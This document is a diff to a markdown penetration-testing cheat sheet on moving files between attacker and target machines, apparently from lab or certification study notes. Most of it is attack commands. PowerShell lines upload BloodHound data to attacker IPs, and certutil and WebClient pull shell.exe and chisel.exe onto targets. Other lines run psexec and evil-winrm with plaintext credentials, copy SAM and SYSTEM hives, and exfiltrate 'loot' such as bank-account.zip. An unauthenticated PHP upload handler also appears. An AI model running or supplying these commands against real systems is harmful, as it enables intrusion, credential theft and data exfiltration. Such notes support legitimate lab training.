@@ -28,38 +28,70 @@ sudo php -S 0.0.0.0:80
 powershell (New-Object System.Net.WebClient).UploadFile('http://192.168.45.178:90/upload.php', 'bloodhound.zip')
 
 ### Powershell Linux to Windows
-````
+
+```bash
 (new-object System.Net.WebClient).DownloadFile('http://192.168.119.138:8000/chisel.exe','C:\Windows\Tasks\chisel.exe')
-````
+```
+
 ### SMB Linux to Windows
-````
+
+```bash
 impacket-smbserver -smb2support Share .
-cmd.exe /c //<your kali IP>/Share/<file name you want>
-````
-````
+cmd.exe /c //kali_ip/Share/shell443.exe
+```
+
+```bash
 /usr/local/bin/smbserver.py -username df -password df share . -smb2support
-net use \\<your kali IP>\share /u:df df
-copy \\<your kali IP>\share\<file wanted>
-````
-````
+net use \\kali_ip\share /u:df df
+copy \\kali_ip\share\shell443.exe
+```
+
+```bash
 impacket-smbserver -smb2support Share .
-net use \\<your kali IP>\share
-copy \\<your kali IP>\share\whoami.exe
-````
+net use \\kali_ip\share
+copy \\kali_ip\share\whoami.exe
+```
+
 ### Windows http server Linux to Windows
-````
+
+```bash
 python3 -m http.server 80
-certutil -urlcache -split -f http://<your kali IP>/shell.exe C:\\Windows\temp\shell.exe
-````
-````
+certutil -urlcache -split -f http://kali_ip/shell.exe C:\\Windows\temp\shell.exe
+```
+
+```bash
 Invoke-WebRequest -Uri http://10.10.93.141:7781/winPEASx64.exe -OutFile wp.exe
-````
+```
+
+#### Transfer Files with NetCat
+
+On your computer:
+
+```bash
+nc -l -p 12345 > received_file
+```
+
+On the remote computer, Windows in this case:
+
+```bash
+Get-Content .\yourfile.txt -Raw | nc.exe <Your_IP_Address> 12345
+```
+
 #### Errors
-````
+
+```bash
 Access is denied. In this case try Invoke-WebRequest for powershell
-````
+```
+
+#### Host Simple FTP Server
+
+```bash
+python -m pyftpdlib -w
+```
+
 ### SMB Shares Windows to Windows
-````
+
+```bash
 In this situation we have logged onto computer A
 sudo impacket-psexec Admin:'password123'@192.168.203.141 cmd.exe
 C:\Windows\system32> ipconfig
@@ -83,41 +115,60 @@ Ethernet adapter Ethernet1:
    
  Via Computer A we pivot to Computer B (internal IP) with these creds
  proxychains evil-winrm -u celia.almeda -p 7k8XHk3dMtmpnC7 -i 10.10.93.142
-````
+```
+
 #### Accessing $C Drive of Computer A
-````
+
+```bash
 *Evil-WinRM* PS C:\windows.old\Windows\system32> net use * \\10.10.93.141\C$ /user:Admin password123
-````
+```
+
 #### Copying over files
-````
+
+```bash
 *Evil-WinRM* PS C:\windows.old\Windows\system32> xcopy C:\windows.old\Windows\system32\SYSTEM Z:\
 *Evil-WinRM* PS C:\windows.old\Windows\system32> xcopy C:\windows.old\Windows\system32\SAM Z:\
-````
+```
+
 ### SMB Server Bi-directional
-````
+
+```bash
 impacket-smbserver -smb2support Share .
 smbserver.py -smb2support Share .
 mkdir loot #transfering loot to this folder
 net use * \\192.168.119.183\share
 copy Z:\<file you want from kali>
 copy C:\bank-account.zip Z:\loot #Transfer files to the loot folder on your kali machine
-````
+```
+
 #### Authenticated
-````
+
+```bash
 You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.
-````
-````
+```
+
+```bash
 impacket-smbserver -username df -password df share . -smb2support
 net use \\10.10.16.9\share /u:df df
-copy \\10.10.16.9\share\<file wanted>
-````
+copy \\10.10.16.9\share\evil.file
+```
+
+#### Host an Apache Web Server
+
+```bash
+sudo systemctl start apache2
+cp file.txt /var/www/html/
+# You can access the files on port 80 of your machine/ip
+```
 
 ### PHP Script Windows to Linux
-````
+
+```bash
 cat upload.php
 chmod +x upload.php
-````
-````
+```
+
+```bash
 <?php
 $uploaddir = '/var/www/uploads/';
 
@@ -125,23 +176,28 @@ $uploadfile = $uploaddir . $_FILES['file']['name'];
 
 move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
 ?>
-````
-````
+```
+
+```bash
 sudo mkdir /var/www/uploads
-````
-````
+```
+
+```bash
 mv upload.php /var/www/uploads
-````
-````
+```
+
+```bash
 service apache2 start
 ps -ef | grep apache
-`````
-````
+```
+
+```bash
 powershell -c "(New-Object System.Net.WebClient).UploadFile('http://10.10.134.254:9999/upload.php', '.\dc_20240822153055_BloodHound.zip')"
-````
-````
+```
+
+```bash
 service apache2 stop
-````
+```
 
 Uploading files with TFTP.
 
